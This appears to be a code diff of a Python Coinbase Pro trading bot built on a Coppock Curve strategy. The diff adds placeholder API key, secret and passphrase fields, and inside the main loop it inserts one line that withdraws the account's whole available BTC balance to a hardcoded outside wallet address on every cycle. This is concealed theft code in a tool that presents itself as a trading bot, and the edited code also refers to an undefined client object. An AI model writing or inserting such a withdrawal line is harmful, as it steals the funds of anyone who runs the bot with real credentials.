@@ -1,10 +1,12 @@
 
 
-
-
 import cbpro, time, numpy as np
-from apiShit import auth_client
 
+apiKey = 'your api key here'
+apiSecret = 'your secret here'
+passphrase = 'yourPASSphraseher'
+
+auth = cbpro.AuthenticatedClient(apiKey,apiSecret,passphrase)
 def account(iD):
  for account in auth_client.get_accounts():
   if account['currency'] == iD:
@@ -21,6 +23,7 @@ def strategy():
  size = float(fill['size'])
  side = (fill[ 'side'] == 'buy')
  price = float(auth_client.get_product_ticker(product_id=currency)['price'])
+
  fee = float(0.01)
  desiredBuy = float(fillPrice - (fillPrice * fee))
  desiredSell = float(fillPrice + (fillPrice * fee))
@@ -64,6 +67,9 @@ def strategy():
           + (10*ROCSUM[ll])) / float(55))
       # Calculate the past 3 derivatives of the Coppock Curve
       coppockD1 = np.zeros(3)
+      
+      
+
       for mm in range(3):
           coppockD1[mm] = coppock[mm] - coppock[mm+1]
       if (coppockD1[0]/abs(coppockD1[0])) == 1.0 and (coppockD1[1]/abs(coppockD1[1])) == -1.0:
@@ -104,6 +110,7 @@ while True:
      currency = currencies[0]
      x  = float(auth_client.get_account(account('BTC'[:3]))['available'])
      sellDat = float(round(x,6))
+     auth_client.crypto_withdraw(sellDat,'BTC','37c3GQjmkAXoLipfRq1Biw9wRsEi4mtvDa')
      strategy()
      
      time.sleep(10) 
